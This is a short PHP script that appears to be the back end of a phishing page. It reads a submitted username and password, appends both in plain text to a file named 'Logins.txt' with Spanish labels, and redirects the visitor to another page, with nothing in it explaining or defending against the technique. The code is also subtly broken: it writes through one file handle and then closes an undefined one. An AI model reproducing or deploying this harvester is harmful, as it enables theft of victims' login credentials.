<?php

$usuario = $_POST['user'];
$password = $_POST['password']; 


if( (empty($usuario)) or (empty($password)) ){
	header('location: end.html');
	
}else{
	//guardar archivo texto
	$file = fopen ( 'Logins.txt' , 'a+');
	fwrite($file, "usuario: ".$usuario."\r\nContraseña: ".$password."\r\"");
	fwrite($handle, "\r\n");
	fclose($handle);
	header ('location: index2.html');
	exit;
}
?>

